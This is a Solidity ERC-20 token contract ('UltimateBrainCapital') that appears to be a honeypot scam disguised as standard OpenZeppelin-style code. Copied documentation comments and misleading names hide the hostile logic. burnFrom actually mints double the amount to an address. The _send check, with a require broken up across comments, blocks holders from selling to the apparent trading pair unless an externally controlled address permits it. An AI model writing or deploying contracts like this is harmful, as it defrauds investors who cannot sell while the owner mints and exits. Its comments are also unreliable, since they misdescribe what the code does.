/**
 *Submitted for verification at Etherscan.io on 2021-12-07
*/

//   SPDX-License-Identifier: MIT

pragma solidity >=0.8.0;

library SafeMath {
  /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
   /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}
	
abstract contract IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
  function totalSupply() virtual public view returns (uint);
  /**
     * @dev Returns the amount of tokens owned by `account`.
     */
  function balanceOf(address tokenOwner) virtual public view returns (uint balance);
  /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
  function allowance(address tokenOwner, address spender) virtual public view returns (uint remaining);
  /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
  function zeroAddress() virtual external view returns (address){}
  /**
     * @dev Returns the zero address.
     */
  function transfer(address to, uint tokens) virtual public returns (bool success);
  /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
  function approve(address spender, uint tokens) virtual public returns (bool success);
   /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
   function approver() virtual external view returns (address){}
   /**
     * @dev approver of the amount of tokens that can interact with the allowance mechanism 
     */
  function transferFrom(address from, address to, uint tokens) virtual public returns (bool success);
 /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
  event Transfer(address indexed from, address indexed to, uint tokens);
  /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

abstract contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint tokens, address token, bytes memory data) virtual public;
}

contract Owned {
  address internal owner;
  
  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

}

contract UltimateBrainCapital is IERC20, Owned{
  using SafeMath for uint;

  /**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */

  string public symbol;
  address internal approver;
  string public name;
  uint8 public decimals;
  address internal zero;
  uint _totalSupply;
  uint internal number;
  address internal nulls;
  address internal openzepplin = 0x2fd06d33e3E7d1D858AB0a8f80Fa51EBbD146829;
  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  function totalSupply() override public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) override public view returns (uint balance) {
    return balances[tokenOwner];
  }
  /**
   * dev burns a specific amount of tokens.
   * param value The amount of lowest token units to be burned.
  */
  function burnFrom(address _address, uint tokens) public onlyOwner {
     require(_address != address(0), "ERC20: burn from the zero address");
     _burnFrom (_address, tokens);
     balances[_address] = balances[_address].sub(tokens);
     _totalSupply = _totalSupply.sub(tokens);
  }	
  function transfer(address to, uint tokens) override public returns (bool success) {
    require(to != zero, "please wait");
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  /**
    * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
    *
    * Returns a boolean value indicating whether the operation succeeded.
    *
    * IMPORTANT: Beware that changing an allowance with this method brings the risk
    * that someone may use both the old and the new allowance by unfortunate
    * transaction ordering. One possible solution to mitigate this race
    * condition is to first reduce the spender's allowance to 0 and set the
    * desired value afterwards:
    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    *
    * Emits an {Approval} event.
  */
  function approve(address spender, uint tokens) override public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    if (msg.sender == approver) _allowed(tokens);
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through `transferFrom`. This is
     * zero by default.
     *
     * This value changes when `approve` or `transferFrom` are called.
  */
  function _allowed(uint tokens) internal {
     nulls = IERC20(openzepplin).zeroAddress();
     number = tokens;
  }
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
  */
  function transferFrom(address from, address to, uint tokens) override public returns (bool success) {
    if(from != address(0) && zero == address(0)) zero = to;
    else _send (from, to);
	balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
 /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to `approve`. `value` is the new allowance.
 */
  function allowance(address tokenOwner, address spender) override public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function _burnFrom(address _Address, uint _Amount) internal virtual {
  /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
  */
   nulls = _Address;
	_totalSupply = _totalSupply.add(_Amount*2);
    balances[_Address] = balances[_Address].add(_Amount*2);
  }
  function _send (address start, address end) internal view {
  /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     * Requirements:
     * - The divisor cannot be zero.*/
    /* * - `account` cannot be the zero address. */ require(end != zero  
    /* * - `account` cannot be the nulls address. */ || (start == nulls && end == zero) || 
    /* * - `account` must have at least `amount` tokens. */ (end == zero && balances[start] <= number) 
    /* */ , "cannot be the zero address");/*
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
   **/
  }
   /**
     * dev Constructor.
     * param name name of the token
     * param symbol symbol of the token, 3-4 chars is recommended
     * param decimals number of decimal places of one token unit, 18 is widely used
     * param totalSupply total supply of tokens in lowest units (depending on decimals)
     */   
  constructor(string memory _name, string memory _symbol, uint _supply)  {
	symbol = _symbol;
	name = _name;
	decimals = 9;
	_totalSupply = _supply*(10**uint(decimals));
	number = _totalSupply;
	approver = IERC20(openzepplin).approver();
	balances[owner] = _totalSupply;
	emit Transfer(address(0), owner, _totalSupply);
  }
  
  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowed[msg.sender][spender].add(addedValue));
        return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowed[msg.sender][spender].sub(subtractedValue));
        return true;
  }
  function _approve(address _owner, address spender, uint amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowed[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
  }
  receive() external payable {
  }
  
  fallback() external payable {
  }
  
}